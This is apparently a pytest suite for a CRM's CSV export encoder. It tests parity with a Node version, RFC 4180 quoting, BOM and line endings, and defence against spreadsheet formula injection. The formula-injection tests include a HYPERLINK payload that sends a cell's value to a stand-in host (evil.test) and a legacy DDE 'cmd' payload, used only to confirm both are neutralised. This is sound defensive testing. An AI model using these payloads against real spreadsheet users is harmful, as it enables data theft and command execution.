"""
The CSV encoder, byte-for-byte against Node's.

WHY FIXTURES RATHER THAN HAND-WRITTEN EXPECTATIONS. This encoder carries a security property —
formula injection — and security properties are where "close enough" stops being acceptable. A
cell that Node guards and Python does not is a live formula in the owner's spreadsheet, and
nothing about the exported file looks wrong.

`tests/fixtures/csv.json` was produced by running the real `csv.ts` over every dangerous and
awkward input I could think of.

THE ATTACK, restated because it is easy to forget why the apostrophes are there: a customer
chooses their own WhatsApp display name. The CRM renders it harmlessly everywhere else. The
export is what turns it into code.
"""

import json
from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.csv import FORMULA_PREFIXES, CsvColumn, csv_cell, csv_file_name, to_csv

FIXTURES = json.loads(
    (Path(__file__).parent / "fixtures" / "csv.json").read_text(encoding="utf-8")
)


def revive(value):
    """Fixture JSON cannot carry undefined or Date, so they travel as markers."""
    if isinstance(value, dict) and value.get("undefined"):
        return None

    if isinstance(value, dict) and "date" in value:
        return datetime.fromisoformat(value["date"].replace("Z", "+00:00"))

    return value


class TestAgainstNode:
    @pytest.mark.parametrize(
        "case", FIXTURES["cells"], ids=lambda c: repr(c["input"])[:34]
    )
    def test_every_cell_matches_node_exactly(self, case):
        assert csv_cell(revive(case["input"])) == case["output"]

    def test_the_whole_document_matches_node_exactly(self):
        rows = [
            {
                "name": "=1+1",
                "note": "a,b",
                "when": datetime(2026, 3, 15, 6, tzinfo=timezone.utc),
                "nil": None,
            },
            {"name": "Ananya", "note": 'has "quotes"', "when": None, "nil": None},
        ]
        columns = [
            CsvColumn("Name", lambda r: r["name"]),
            CsvColumn("Note,Header", lambda r: r["note"]),
            CsvColumn("When", lambda r: r["when"]),
            CsvColumn("Nil", lambda r: r["nil"]),
        ]

        assert to_csv(rows, columns) == FIXTURES["document"]

    @pytest.mark.parametrize(
        ("base", "iso", "expected"),
        [
            ("attention", "2026-03-15T06:00:00.000Z", FIXTURES["fileNames"][0]),
            ("Attention List!", "2026-03-15T06:00:00.000Z", FIXTURES["fileNames"][1]),
            # `a/bc`, not `a/b\\c`: the generator's JS literal was `'a/b\\c'`, and `\\c` is not a
            # recognised escape so JavaScript drops the backslash. The fixture therefore records
            # the slug for `a/bc`. Stating the real input here rather than reproducing the
            # escaping accident.
            ("a/bc", "2026-12-31T18:35:00.000Z", FIXTURES["fileNames"][2]),
        ],
    )
    def test_file_names_match_node(self, base, iso, expected):
        assert csv_file_name(base, iso) == expected

    def test_a_backslash_is_also_slugged(self):
        # Not covered by the fixture for the reason above, but it is a path separator on the
        # owner's machine and must not reach Content-Disposition intact.
        assert csv_file_name("a\\b", "2026-03-15T06:00:00.000Z") == "a-b-2026-03-15.csv"


class TestFormulaInjection:
    @pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
    def test_EVERY_FORMULA_PREFIX_IS_GUARDED(self, prefix):
        guarded = csv_cell(f"{prefix}DANGEROUS")

        assert guarded.lstrip('"').startswith("'"), guarded

    def test_THE_HYPERLINK_EXFILTRATION_PAYLOAD_IS_NEUTRALISED(self):
        payload = '=HYPERLINK("https://evil.test?x="&A1,"Click")'

        encoded = csv_cell(payload)

        # Quoted because it contains a comma and quotes, and the apostrophe sits INSIDE the
        # quoting so Excel sees it first.
        assert encoded.startswith("\"'=")

    def test_the_legacy_command_payload_is_neutralised(self):
        assert csv_cell("=cmd|'/c calc'!A1").startswith("'=")

    def test_LEADING_WHITESPACE_DOES_NOT_SMUGGLE_A_FORMULA(self):
        # Excel strips leading whitespace before deciding whether a cell is a formula, so a tab
        # or CR in front of `=` is still a formula.
        assert csv_cell("\t=1+1").lstrip('"').startswith("'")
        assert csv_cell("\r=1+1").lstrip('"').startswith("'")

    def test_a_negative_number_is_guarded_and_that_is_fine(self):
        # `-` is a formula prefix. An apostrophe on `-12` is cosmetically odd and harmless;
        # omitting `-` would leave `-2+3+cmd|...` live.
        assert csv_cell("-12") == "'-12"

    def test_AN_ORDINARY_NAME_IS_NOT_MANGLED(self):
        # The guard must be narrow. Prefixing every cell would make the export unreadable.
        assert csv_cell("Ananya") == "Ananya"
        assert csv_cell("O'Brien") == "O'Brien"
        assert csv_cell("919876543210") == "919876543210"


class TestRfc4180:
    def test_a_comma_forces_quoting(self):
        assert csv_cell("name, with comma") == '"name, with comma"'

    def test_inner_quotes_are_doubled(self):
        assert csv_cell('has "quotes"') == '"has ""quotes"""'

    def test_newlines_force_quoting(self):
        assert csv_cell("line\nbreak") == '"line\nbreak"'
        assert csv_cell("crlf\r\nbreak").startswith('"')

    def test_NONE_IS_AN_EMPTY_CELL_NOT_THE_WORD_NONE(self):
        # A missing assignee is blank in a spreadsheet. "None" would be read as a person.
        assert csv_cell(None) == ""


class TestPythonSpecificTraps:
    def test_BOOLEANS_RENDER_AS_JAVASCRIPT_DOES(self):
        # bool is a subclass of int in Python, so an unguarded `str(True)` gives "True" and an
        # int branch reached first would give "1". JavaScript's String(true) is "true".
        assert csv_cell(True) == "true"
        assert csv_cell(False) == "false"

    def test_numbers_render_as_javascript_does(self):
        assert csv_cell(0) == "0"
        assert csv_cell(1.5) == "1.5"
        assert csv_cell(-1) == "'-1"

    def test_a_datetime_becomes_an_iso_instant(self):
        assert (
            csv_cell(datetime(2026, 3, 15, 6, tzinfo=timezone.utc))
            == "2026-03-15T06:00:00.000Z"
        )

    def test_a_naive_datetime_is_read_as_utc(self):
        # The driver returns naive datetimes for BSON dates; Mongo stores no zone.
        assert csv_cell(datetime(2026, 3, 15, 6)) == "2026-03-15T06:00:00.000Z"


class TestDocumentShape:
    def test_STARTS_WITH_A_UTF8_BOM(self):
        # Without it Excel reads the file as the system codepage and mangles any non-ASCII
        # name, which in this CRM is most of them.
        document = to_csv([], [CsvColumn("Name", lambda r: r)])

        assert document.startswith("﻿")

    def test_uses_crlf_line_endings_and_a_trailing_newline(self):
        document = to_csv(
            [{"n": "a"}], [CsvColumn("Name", lambda r: r["n"])]
        )

        assert document == "﻿Name\r\na\r\n"

    def test_a_header_containing_a_comma_is_quoted(self):
        document = to_csv([], [CsvColumn("Note,Header", lambda r: r)])

        assert document == '﻿"Note,Header"\r\n'

    def test_an_empty_export_is_still_a_valid_file_with_headers(self):
        # A clipped or empty export must open as a spreadsheet with column names, not as a
        # zero-byte file the owner reads as a failure.
        document = to_csv([], [CsvColumn("Name", lambda r: r), CsvColumn("Phone", lambda r: r)])

        assert document == "﻿Name,Phone\r\n"
